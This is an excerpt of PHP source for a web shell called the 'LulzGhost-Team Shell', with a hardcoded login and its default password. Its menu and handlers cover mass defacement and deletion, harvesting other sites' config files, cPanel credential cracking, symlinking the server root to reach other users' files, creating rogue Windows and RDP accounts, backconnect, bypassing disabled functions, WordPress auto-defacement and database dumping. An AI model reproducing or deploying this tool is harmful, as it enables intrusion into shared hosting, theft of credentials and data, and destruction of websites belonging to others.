...
$auth_user =
"ghost";
$auth_pass = "dce75d9fdf62f726de40ef54d208808c"; //default : lulzghostteam
$color = "#00ff00"; 
...
<body bgcolor="black">
 ...
 <header>
 <pre> 
<img src="https://i.ibb.co/dQsbFqm/peler.jpg"height="400">
 </pre> 
</header> 
<form method="post">
Username
...
<link rel="shortcut icon" href="http://rootkitninja.com/images/devil.jpg"/>
<title>LulzGhost-Team Shell</title>
<style type="text/css">
...
echo"<h1><tr><td><center><font color='red'></font><font color='white'></center></h1>
...
echo " <li><a href='?dir=$dir&ghost=info'>Server Info</a></li>";
echo " <li><a href='?dir=$dir&ghost=cmd'>Command</a></li>";
echo " <li><a href='?dir=$dir&ghost=mass_deface'>Mass Deface</a></li>";
echo "  <li><a href='?dir=$dir&ghost=mass_delete'> Mass Delete </a></li>";
echo "<br><br>";
echo "  <li><a href='?dir=$dir&ghost=config'>Config</a></li>";
echo "  <li><a href='?dir=$dir&ghost=jumping'>Loncat Indah</a></li>";
echo "  <li><a href='?dir=$dir&ghost=cpanel'>Cpanel Crack</a></li>";
echo "  <li><a href='?dir=$dir&ghost=sym'>Symlink</a></li>";
echo "  <li><a href='?dir=$dir&ghost=network'>Network</a></li>";
echo "  <li><a href='?dir=$dir&ghost=fake_root'>Fake Root</a></li><br><br>";
echo "  <li><a href='?dir=$dir&ghost=cgi'>Cgi-Telnet</a></li>";
echo "  <li><a href='?dir=$dir&ghost=bypass'>Bypass Disable Functions</a></li>";
echo "  <li><a href='?dir=$dir&ghost=rdp'>K-RDP Shell</a></li>";
echo "  <li><a href='?dir=$dir&ghost=backconnect'>Backconnect V.2</a></li>";
echo "  <li><a href='?dir=$dir&ghost=zoneh'>Zone-H Mass Notifier</a></li>";
echo "<br><br>";
echo "  <li><a href='?dir=$dir&ghost=upload'>Upload</a></li>";
echo "  <li><a href='?dir=$dir&ghost=adminer'>Adminer</a></li>";
echo "  <li><a href='?dir=$dir&ghost=edit_user'>Auto Edit User</a></li>";
echo "  <li><a href='?dir=$dir&ghost=auto_wp'>Auto Edit Title WordPress</a></li>";
echo "  <li><a href='?dir=$dir&ghost=auto_dwp'>WordPress Auto Deface</a></li>";
echo "  <li><a href='?dir=$dir&ghost=dbdump'>DB Dump</a></li>";
echo "  <li><a href='?dir=$dir&ghost=symlink2'>Symlink V.2</a></li>";
echo "<br><br>";
echo "  <li><a style='color: red;' href='?dir=$dir&ghost=kill'>Kill Me</a></li>";
...
elseif($_GET['ghost'] == 'mass_deface') {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by ./ghost</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['ghost'] == 'mass_delete') {
...
elseif($_GET['ghost'] == 'sym') {
   @set_time_limit(0);

echo "<br><br><center><h1>+--=[ Symlink By ./ghost ]=--+</h1></center><br><br><center><div class=content>";
...
elseif($_GET['ghost'] == 'cpanel') {
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>./ghost.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
...
//CONFIG
elseif($_GET['ghost'] == 'config') {
	$idx = mkdir("ghost_config", 0777);
					...
					if(is_readable($user_config_dir)) {
						...
						foreach($grab_config as $config => $nama_config) {
							...
							if($ambil_config == '') {
								...
								$file_config = fopen("ghost_config/$user_idx-$nama_config.txt","w");
	...
	echo "<center><a href='?dir=$dir/ghost_config'><font color=lime>Done</font></a></center>";
	}
}

//FKROOT
elseif($_GET['ghost'] == 'fake_root') {
	ob_start();
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user ghost");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>ghost</font>] -> ";
					if($cek) {
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='ghost' required>
			<input type='text' name='pass' placeholder='password' value='ghostrdp' required>
...
elseif($_GET['ghost'] == 'zoneh') {
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='./ghost'><br>
		<u>Domains</u>: <br>
...
elseif($_GET['ghost'] == 'edit_user') {
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='ghost123' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='ghostshell123' placeholder='pass_baru'><br>
...
elseif($_GET['ghost'] == 'auto_wp') {
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by ./ghost' placeholder='New Title'><br><br>
...
elseif($_GET['ghost'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by LulzGhost-Team' required><br>
...
//symlink2
elseif($_GET['ghost'] == 'symlink2') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("ghost_sym",0777);
@chdir("ghost_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex ghost.htm
AddType text/plain .php
...
<td>".$user['name']."</td>
<td><a href='$full/ghost_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 echo "<td align=center><font class=txt><a href=$full/ghost_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("ghost_sym",0777);@chdir("ghost_sym");@exe("ln -s / root");$file3 = '
...
//cgitelnet
elseif($_GET['ghost'] == 'cgi') {
	$cgi_dir = mkdir('ghost_cgi', 0755);
	$file_cgi = "ghost_cgi/cgi.izo";
	...
	chmod($file_cgi, 0755);
	echo "<iframe src='ghost_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='/' target='_blank'><font color=lime>LulzGhost-Team</font></a></center>";
}
?>
